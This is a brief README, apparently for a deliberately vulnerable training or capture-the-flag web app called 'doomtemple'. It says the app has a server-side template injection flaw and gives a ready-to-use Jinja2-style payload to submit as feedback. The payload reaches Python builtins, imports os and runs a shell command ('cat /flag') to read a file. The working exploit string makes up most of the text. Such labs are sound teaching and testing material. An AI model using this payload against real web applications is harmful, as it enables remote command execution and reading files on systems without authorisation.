# doomtemple

This sample web application contains a server-side template injection attack.
Submit this as feedback:
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}